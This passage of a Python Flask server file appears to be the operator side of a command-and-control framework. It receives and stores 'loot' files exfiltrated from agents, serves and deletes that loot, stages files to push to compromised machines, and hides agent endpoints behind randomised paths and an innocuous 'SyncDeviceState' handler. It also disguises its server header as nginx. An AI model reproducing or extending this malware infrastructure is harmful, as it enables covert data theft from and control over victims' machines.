    file_data = file.read()
    if hashlib.sha256(file_data).hexdigest() != meta.get("sha256"):
        conn.close()
        return jsonify({"error": "Integrity check failed"}), 400

    # nonce INSERT shares conn with loot INSERT so both commit atomically
    try:
        conn.execute(
            "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
            (kid, nonce_hex),
        )
    except sqlite3.IntegrityError:
        conn.close()
        return jsonify({"error": "Replay detected"}), 409

    agent_id = meta.get("agent_id", "unknown")
    original_path = request.form.get("original_path", "")
    filename = secure_filename(file.filename) if file.filename else "unnamed"
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    # Random suffix prevents same-second collisions between uploads with
    # the same sanitized filename.
    random_suffix = os.urandom(4).hex()
    save_name = f"{timestamp}_{random_suffix}_{filename}"
    save_path = os.path.join(LOOT_DIR, save_name)

    file_created = False
    try:
        # O_CREAT|O_EXCL guarantees we never silently overwrite another
        # upload's file, even on a freak random-suffix collision.
        fd = os.open(save_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
        file_created = True
        try:
            total_written = 0
            data_view = memoryview(file_data)
            while total_written < len(file_data):
                n = os.write(fd, data_view[total_written:])
                if n <= 0:
                    raise OSError(f"Short write: wrote 0 bytes at offset {total_written}/{len(file_data)}")
                total_written += n
            if total_written != len(file_data):
                raise OSError(f"Short write: wrote {total_written} of {len(file_data)} bytes")
            os.fsync(fd)
        finally:
            os.close(fd)

        conn.execute(
            "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
            (agent_id, filename, original_path, save_path, len(file_data)),
        )
        conn.commit()
        return jsonify({"status": "ok", "filename": filename, "size": len(file_data)})
    except Exception:
        # Only remove the file if *this* attempt created it.
        if file_created and os.path.exists(save_path):
            try:
                os.remove(save_path)
            except OSError:
                pass
        raise
    finally:
        conn.close()


@app.route("/api/loot", methods=["GET"])
def get_loot():
    """Return all exfiltrated files."""
    conn = get_db_connection()
    loot = conn.execute("SELECT * FROM loot ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "loot": [
            {
                "id": l["id"],
                "agent_id": l["agent_id"],
                "filename": l["filename"],
                "original_path": l["original_path"],
                "file_size": l["file_size"],
                "created_at": l["created_at"],
            }
            for l in loot
        ]
    })


@app.route("/api/loot/download/<int:loot_id>", methods=["GET"])
def download_loot(loot_id):
    """Download an exfiltrated file."""
    conn = get_db_connection()
    item = conn.execute("SELECT * FROM loot WHERE id = ?", (loot_id,)).fetchone()
    conn.close()

    if not item:
        return jsonify({"error": "Loot not found"}), 404

    file_path = item["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    return send_file(file_path, as_attachment=True, download_name=item["filename"])


@app.route("/api/loot/<int:loot_id>", methods=["DELETE"])
def delete_loot(loot_id):
    """Delete a loot record, then remove its file through a durable queue."""
    return _delete_managed_file_record("loot", loot_id)


def _managed_file_path(kind, file_path):
    directory = LOOT_DIR if kind == "loot" else STAGED_DIR
    return (isinstance(file_path, str) and os.path.isabs(file_path) and
            os.path.dirname(os.path.realpath(file_path)) == os.path.realpath(directory) and
            not os.path.islink(file_path))


def _remove_queued_file(conn, cleanup_id, kind, file_path):
    if not _managed_file_path(kind, file_path):
        app.logger.error("Refusing file cleanup outside managed directory: %s", file_path)
        return False
    if (conn.execute("SELECT 1 FROM loot WHERE file_path = ? LIMIT 1", (file_path,)).fetchone() or
            conn.execute("SELECT 1 FROM staged_files WHERE file_path = ? LIMIT 1", (file_path,)).fetchone()):
        app.logger.error("Refusing file cleanup for a path still referenced by a record")
        return False
    try:
        os.remove(file_path)
    except FileNotFoundError:
        pass
    except OSError:
        app.logger.exception("Could not remove queued file: %s", file_path)
        return False
    conn.execute("DELETE FROM file_cleanup_queue WHERE id = ?", (cleanup_id,))
    conn.commit()
    return True


def _delete_managed_file_record(kind, record_id):
    table = "loot" if kind == "loot" else "staged_files"
    label = "Loot" if kind == "loot" else "File"
    conn = get_db_connection()
    try:
        conn.execute("BEGIN IMMEDIATE")
        item = conn.execute(f"SELECT file_path FROM {table} WHERE id = ?", (record_id,)).fetchone()
        if not item:
            return jsonify({"error": f"{label} not found"}), 404
        file_path = item["file_path"]
        if not _managed_file_path(kind, file_path):
            return jsonify({"error": "File is outside the managed directory"}), 500
        if (conn.execute("SELECT 1 FROM loot WHERE file_path = ? AND (? != 'loot' OR id != ?) LIMIT 1",
                         (file_path, kind, record_id)).fetchone() or
                conn.execute("SELECT 1 FROM staged_files WHERE file_path = ? AND (? != 'staged' OR id != ?) LIMIT 1",
                             (file_path, kind, record_id)).fetchone()):
            return jsonify({"error": "File is referenced by another record"}), 409
        cleanup_id = conn.execute(
            "INSERT INTO file_cleanup_queue (kind, file_path) VALUES (?, ?)",
            (kind, file_path),
        ).lastrowid
        conn.execute(f"DELETE FROM {table} WHERE id = ?", (record_id,))
        conn.commit()
        if not _remove_queued_file(conn, cleanup_id, kind, file_path):
            return jsonify({"error": "Record deleted; file cleanup queued for retry on restart"}), 500
        return jsonify({"status": "ok"})
    except sqlite3.Error:
        conn.rollback()
        app.logger.exception("Could not delete %s record %s", kind, record_id)
        return jsonify({"error": f"Could not delete {label.lower()} record"}), 500
    finally:
        conn.close()


def retry_queued_file_cleanup():
    """Retry file removals committed with deleted loot/staged records."""
    conn = get_db_connection()
    try:
        rows = conn.execute("SELECT id, kind, file_path FROM file_cleanup_queue ORDER BY id").fetchall()
        for row in rows:
            try:
                _remove_queued_file(conn, row["id"], row["kind"], row["file_path"])
            except sqlite3.Error:
                app.logger.exception("Could not acknowledge file cleanup %s", row["id"])
                conn.rollback()
    finally:
        conn.close()


# Files staged for agents.

@app.route("/api/files/stage", methods=["POST"])
def stage_file():
    """Operator uploads a file to stage for pushing to an agent."""
    if "file" not in request.files:
        return jsonify({"error": "No file provided"}), 400

    file = request.files["file"]
    filename = secure_filename(file.filename) if file.filename else "unnamed"
    file_data = file.read()
    name, ext = os.path.splitext(filename)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Try original name, then timestamp fallback, then random-suffix fallbacks.
    # Exclusive creation (O_CREAT|O_EXCL) guarantees we never silently overwrite
    # a pre-existing candidate path or another concurrent upload.
    candidates = [
        filename,
        f"{name}_{timestamp}{ext}",
    ]
    fd = -1
    save_name = None
    save_path = None
    file_created = False

    for cand in candidates:
        cand_path = os.path.join(STAGED_DIR, cand)
        try:
            fd = os.open(cand_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
            save_name = cand
            save_path = cand_path
            file_created = True
            break
        except FileExistsError:
            continue
        except OSError:
            raise

    if fd == -1:
        # Both original and candidate timestamp paths exist; use random suffix.
        for _ in range(100):
            rand = os.urandom(4).hex()
            cand = f"{name}_{timestamp}_{rand}{ext}"
            cand_path = os.path.join(STAGED_DIR, cand)
            try:
                fd = os.open(cand_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
                save_name = cand
                save_path = cand_path
                file_created = True
                break
            except FileExistsError:
                continue
        if fd == -1:
            return jsonify({"error": "Failed to allocate unique staged file path"}), 500

    try:
        try:
            total_written = 0
            data_view = memoryview(file_data)
            while total_written < len(file_data):
                n = os.write(fd, data_view[total_written:])
                if n <= 0:
                    raise OSError(f"Short write: wrote 0 bytes at offset {total_written}/{len(file_data)}")
                total_written += n
            if total_written != len(file_data):
                raise OSError(f"Short write: wrote {total_written} of {len(file_data)} bytes")
            os.fsync(fd)
        finally:
            os.close(fd)

        file_size = len(file_data)
        conn = get_db_connection()
        try:
            cursor = conn.execute(
                "INSERT INTO staged_files (filename, file_path, file_size) VALUES (?, ?, ?)",
                (save_name, save_path, file_size),
            )
            file_id = cursor.lastrowid
            conn.commit()
        finally:
            conn.close()

        return jsonify({"status": "ok", "file_id": file_id, "filename": save_name, "file_size": file_size})
    except Exception:
        if file_created and save_path and os.path.exists(save_path):
            try:
                os.remove(save_path)
            except OSError:
                pass
        raise


@app.route("/api/files", methods=["GET"])
def get_staged_files():
    """Return all staged files."""
    conn = get_db_connection()
    files = conn.execute("SELECT * FROM staged_files ORDER BY created_at DESC").fetchall()
    conn.close()

    return jsonify({
        "files": [
            {
                "id": f["id"],
                "filename": f["filename"],
                "file_size": f["file_size"],
                "created_at": f["created_at"],
            }
            for f in files
        ]
    })


def serve_staged_file(file_id):
    """Serve a staged file only for an authenticated agent's sent download task."""
    agent_id = request.headers.get("X-Agent-ID", "")
    auth = request.headers.get("Authorization", "")
    task_id_raw = request.headers.get("X-Task-ID", "")
    if not auth.startswith("Bearer ") or not task_id_raw.isdecimal() or len(task_id_raw) > 19:
        return jsonify({"error": "Agent authentication required"}), 401
    task_id = int(task_id_raw)
    if task_id > 9223372036854775807:
        return jsonify({"error": "Invalid task ID"}), 400

    conn = get_db_connection()
    if not _agent_authenticated(conn, agent_id, auth[7:]):
        conn.close()
        return jsonify({"error": "Invalid agent identity"}), 401

    task = conn.execute(
        "SELECT command, status FROM tasks WHERE id = ? AND agent_id = ?",
        (task_id, agent_id),
    ).fetchone()
    parts = task["command"].split(maxsplit=2) if task else []
    if (
        not task or task["status"] != "sent" or len(parts) != 3 or
        parts[0] != "download" or not parts[1].isdecimal() or int(parts[1]) != file_id
    ):
        conn.close()
        return jsonify({"error": "File not assigned to agent"}), 403

    f = conn.execute("SELECT * FROM staged_files WHERE id = ?", (file_id,)).fetchone()
    conn.close()

    if not f:
        return jsonify({"error": "File not found"}), 404

    file_path = f["file_path"]
    if not os.path.exists(file_path):
        return jsonify({"error": "File not found on disk"}), 404

    response = send_file(file_path, as_attachment=True, download_name=f["filename"])
    response.headers["Cache-Control"] = "private, no-store"
    return response


@app.route("/api/files/<int:file_id>", methods=["DELETE"])
def delete_staged_file(file_id):
    """Delete a staged record, then remove its file through a durable queue."""
    return _delete_managed_file_record("staged", file_id)


# Agent route registration.

def _register_agent_routes():
    """
    Wire up the four agent endpoints to their randomised paths.
    Uses add_url_rule() instead of decorators because the paths come
    from the DB and aren't known until after init.
    """
    app.add_url_rule(AGENT_PATH_CHECKIN, "agent_checkin", SyncDeviceState, methods=["POST"])
    app.add_url_rule(AGENT_PATH_RESULT,  "agent_result",  submit_result,   methods=["POST"])
    app.add_url_rule(AGENT_PATH_UPLOAD,  "agent_upload",  receive_upload,  methods=["POST"])
    app.add_url_rule(
        AGENT_PATH_FILES + "/<int:file_id>",
        "agent_files",
        serve_staged_file,
        methods=["GET"],
    )


_register_agent_routes()

retry_queued_build_cleanup()
retry_queued_file_cleanup()
purge_destroyed_agents()


# Periodic cleanup.

def _nonce_cleanup_loop():
    while True:
        time.sleep(3600)
        try:
            purge_retired_build_nonces()
            purge_destroyed_agents()
        except Exception:
            pass

threading.Thread(target=_nonce_cleanup_loop, daemon=True, name="nonce-cleanup").start()


# Development server entry point.

if __name__ == "__main__":
    # Werkzeug writes its own Server header at the socket level before our
    # @after_request hook fires. Patch it here or both headers show up in the response.
    from werkzeug.serving import WSGIRequestHandler
    setattr(WSGIRequestHandler, "server_version", "nginx/1.24.0")
    setattr(WSGIRequestHandler, "sys_version", "")

    _cert_path, _key_path = _active_tls_paths()

    if os.path.exists(_cert_path) and os.path.exists(_key_path):
        _ssl_ctx = (_cert_path, _key_path)
        _tls_status = "ENABLED (self-signed)"
    else:
        _ssl_ctx = None
        _tls_status = "DISABLED (no certs found in server/certs/)"

    print("\n=======================================")
    print("  Operator API Key (paste into dashboard):")
    print(f"  {API_KEY}")
    print(f"  TLS       : {_tls_status}")
    if _ssl_ctx is None:
        print("  WARNING   : Agents built with cert pinning will NOT connect without TLS.")
    print("=======================================\n")

    app.run(host="0.0.0.0", port=5000, debug=False, ssl_context=_ssl_ctx)
